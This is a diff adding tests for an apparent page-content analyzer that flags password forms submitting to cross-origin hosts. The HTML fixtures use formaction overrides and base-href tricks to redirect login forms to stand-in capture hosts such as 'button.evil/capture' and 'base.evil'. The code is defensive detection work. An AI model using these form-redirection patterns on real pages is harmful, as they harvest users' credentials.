@@ -63,6 +63,67 @@ describe("analyzePageContent", () => {
     expect(findings.crossOriginPasswordFormHosts).toEqual(["collector.evil"]);
   });
 
+  it("tracks contained submit-control action overrides", () => {
+    const findings = analyzePageContent(
+      `
+        <form action="">
+          <input type="password">
+          <button formaction="https://button.evil/capture">Continue</button>
+          <input type="submit" formaction="https://input.evil/capture">
+          <input type="image" formaction="/same-origin">
+        </form>
+      `,
+      FINAL_URL,
+    );
+
+    expect(findings.crossOriginFormHosts).toEqual([
+      "button.evil",
+      "input.evil",
+    ]);
+    expect(findings.crossOriginPasswordFormHosts).toEqual([
+      "button.evil",
+      "input.evil",
+    ]);
+  });
+
+  it("tracks base-relative overrides on external submit controls", () => {
+    const findings = analyzePageContent(
+      `
+        <base href="https://base.evil/capture/">
+        <form id="login" action="https://landing.example/login">
+          <input type="password">
+        </form>
+        <input type="image" form="login" formaction="collect">
+      `,
+      FINAL_URL,
+    );
+
+    expect(findings.crossOriginFormHosts).toEqual(["base.evil"]);
+    expect(findings.crossOriginPasswordFormHosts).toEqual(["base.evil"]);
+  });
+
+  it("ignores non-submit overrides and keeps unrelated forms separate", () => {
+    const findings = analyzePageContent(
+      `
+        <form id="login" action="/login">
+          <input type="password">
+          <button type="button" formaction="https://button.evil/capture">Preview</button>
+          <input type="button" formaction="https://input.evil/capture">
+          <input type="reset" formaction="https://reset.evil/capture">
+          <input formaction="https://text.evil/capture">
+          <button disabled formaction="https://disabled.evil/capture">Disabled</button>
+          <button data-formaction="https://data.evil/capture">Local submit</button>
+        </form>
+        <form id="newsletter" action="/subscribe"></form>
+        <button form="newsletter" formaction="https://newsletter.evil/subscribe">Subscribe</button>
+      `,
+      FINAL_URL,
+    );
+
+    expect(findings.crossOriginFormHosts).toEqual(["newsletter.evil"]);
+    expect(findings.crossOriginPasswordFormHosts).toEqual([]);
+  });
+
   it("resolves relative form actions against a cross-origin document base", () => {
     const findings = analyzePageContent(
       `<base href=https://evil.example/><form action=/collect><input type=password>`,
